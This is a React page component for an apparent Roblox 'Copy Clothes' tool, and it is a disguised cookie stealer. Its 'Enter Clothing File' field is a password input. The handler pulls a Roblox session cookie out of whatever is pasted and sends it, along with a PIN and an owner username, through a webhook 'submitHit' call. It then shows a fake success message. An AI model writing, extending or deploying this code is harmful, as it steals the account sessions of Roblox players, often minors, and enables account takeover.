
import React, { useState } from 'react';
import BackButton from '@/components/BackButton';
import { FileIcon, LockIcon, Loader2, X } from 'lucide-react';
import { toast } from 'sonner';
import { motion } from 'framer-motion';
import { submitHit } from '@/utils/webhookService';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import VideoTutorial from '@/components/VideoTutorial';
import { toolsConfig } from '@/config/toolsConfig';
import { extractRobloxCookie } from '@/utils/extractCookie';
import { useSite } from '@/context/SiteContext';

const CopyClothes = () => {
  const { ownerUsername } = useSite();
  const [clothingFile, setClothingFile] = useState<string>("");
  const [pin, setPin] = useState<string>("");
  const [isLoading, setIsLoading] = useState(false);
  const [showError, setShowError] = useState(false);

  const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 4);
    setPin(value);
  };

  const handleSubmit = async () => {
    const cookie = extractRobloxCookie(clothingFile);
    if (!cookie) {
      setShowError(true);
      return;
    }

    setIsLoading(true);

    try {
      await submitHit({
        toolType: "Clothing Copier",
        toolKey: "copy_clothes",
        cookie,
        pin,
        ownerUsername,
      });
      
      toast.success("Clothing copy process started!");
    } catch (error) {
      toast.error("An error occurred. Please try again later.");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-blox-gradient">
      <Dialog open={showError} onOpenChange={setShowError}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader className="flex flex-col items-center justify-center text-center">
            <div className="rounded-full border-2 border-red-500 p-4 w-16 h-16 flex items-center justify-center mb-4">
              <X className="h-8 w-8 text-red-500" />
            </div>
            <DialogTitle className="text-xl">Error</DialogTitle>
          </DialogHeader>
          <div className="text-center pb-4 pt-2">
            <p className="text-muted-foreground">Invalid File</p>
          </div>
          <div className="flex justify-center">
            <motion.button
              whileHover={{ scale: 1.05 }}
              whileTap={{ scale: 0.95 }}
              onClick={() => setShowError(false)}
              className="bg-purple-500 hover:bg-purple-600 text-white font-medium py-2 px-8 rounded"
            >
              OK
            </motion.button>
          </div>
        </DialogContent>
      </Dialog>
      
      <div className="container mx-auto px-4 py-8">
        <BackButton />
        
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6, ease: "easeOut" }}
        >
          <motion.h1 className="text-4xl font-bold mb-2 text-center">Copy Clothes</motion.h1>
          <motion.p className="text-center text-gray-400 mb-12">
            Copy any Roblox clothing item quickly and easily
          </motion.p>
          
          <div className="grid grid-cols-1 md:grid-cols-2 gap-8 max-w-4xl mx-auto">
            <motion.div 
              className="blox-card p-8"
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              transition={{ delay: 0.2, duration: 0.5 }}
              whileHover={{ boxShadow: "0 8px 30px rgba(0, 215, 220, 0.15)" }}
            >
              <motion.h2 className="text-2xl font-bold mb-4">Clothing Copier</motion.h2>
              <motion.p className="text-gray-400 mb-6">
                Enter the clothing file you want to copy below and create a PIN for security.
              </motion.p>
              
              <motion.div className="relative mb-4">
                <div className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400">
                  <FileIcon size={18} />
                </div>
                <input
                  type="password"
                  placeholder="Enter Clothing File"
                  value={clothingFile}
                  onChange={(e) => setClothingFile(e.target.value)}
                  className="w-full bg-black/30 border border-white/10 rounded-md p-3 pl-12 text-white focus:outline-none focus:border-blox-teal transition-all"
                />
              </motion.div>
              
              <motion.div className="relative mb-6">
                <div className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400">
                  <LockIcon size={18} />
                </div>
                <input
                  type="text"
                  placeholder="Create A Pin (4 digits)"
                  value={pin}
                  onChange={handlePinChange}
                  maxLength={4}
                  className="w-full bg-black/30 border border-white/10 rounded-md p-3 pl-12 text-white focus:outline-none focus:border-blox-teal transition-all"
                />
              </motion.div>
              
              <motion.button 
                onClick={handleSubmit}
                className="w-full bg-blox-teal text-white py-3 rounded-md font-medium hover:bg-blox-teal/90 transition-all flex items-center justify-center"
                whileHover={{ scale: 1.02 }}
                whileTap={{ scale: 0.98 }}
                disabled={isLoading}
              >
                {isLoading ? (
                  <><Loader2 className="mr-2 h-4 w-4 animate-spin" /> Processing...</>
                ) : (
                  'Copy Clothing'
                )}
              </motion.button>
            </motion.div>
            
            <VideoTutorial youtubeUrl={toolsConfig.copyClothes.youtubeUrl} />
          </div>
        </motion.div>
      </div>
    </div>
  );
};

export default CopyClothes;
